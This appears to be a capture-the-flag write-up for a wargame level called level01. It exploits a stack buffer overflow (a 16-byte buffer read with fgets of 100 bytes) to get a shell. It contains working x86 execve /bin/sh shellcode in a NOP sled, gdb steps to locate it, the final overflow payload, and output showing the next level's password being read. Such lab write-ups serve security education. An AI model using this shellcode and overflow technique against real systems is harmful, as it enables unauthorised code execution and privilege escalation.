# level01

`buffer` is 16 bytes long, but we have a `fgets(buffer, 100, stdin)`, so we can overflow it.  
We will use an environment variable to store the payload.

```sh
$> export SHELLCODE="nl"$(python -c 'print("\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*100)')
```

We then retrieve `SHELLCODE`'S

```sh
$> gdb -q level01 
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80484d5
(gdb) r
Starting program: /home/users/level01/level01 

Breakpoint 1, 0x080484d5 in main ()
(gdb) x/32s *((char **)environ)
0xffffd7fe:	 "SHELLCODE=[...]"
[...]
```

We add `~20 bytes` to that address to be in the no-ops when jumping into it.
```
0xffffd7fe + 20 = 0xffffd808
```

We just have to create our payload :
```sh
$> (python -c 'print("dat_wil"); print("A"*80 + "\x0f\xd8\xff\xff")'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

$ whoami
level02
$ cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
